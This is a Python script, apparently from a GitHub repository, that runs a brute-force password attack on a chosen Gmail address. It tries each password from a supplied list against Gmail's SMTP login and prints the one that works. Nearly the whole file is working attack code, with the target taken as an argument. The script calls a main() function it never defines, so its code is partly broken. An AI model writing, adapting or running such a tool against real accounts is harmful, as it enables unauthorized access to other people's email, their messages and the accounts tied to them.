#github/async0

import smtplib
import sys
import argparse, subprocess
from os import system
system("clear")
system("cat src/banner.txt")

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if __name__ == "__main__":

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help="set target mail address", dest='target', required=True)
    parser.add_argument('-p', '--passlist', help="set passlist", dest='plist', required=True)
    args = parser.parse_args()

    targ3t = (args.target)
    pl1st = (args.plist)
    pass_file = open(pl1st, 'r')
    pass_list = pass_file.readlines()

    def force():
        j = 0
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        for password in pass_list:
            j = j + 1
            print(str(j) + '/' + str(len(pass_list)))
            try:
                server.login(targ3t, password)
                system('clear')
                main()
                print('n')
                print(bcolors.OKGREEN + '[+] password found =>' + password)
                break
            except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                    system('clear')
                    main()
                    print(bcolors.WARNING + '[!] password found => ' + password)
                    break
                else:
                    print(bcolors.FAIL + '[!] trying => ' + password)
    
    try:
        force()
    except KeyboardInterrupt:
        print("\nThe tool was stopped by the user.")
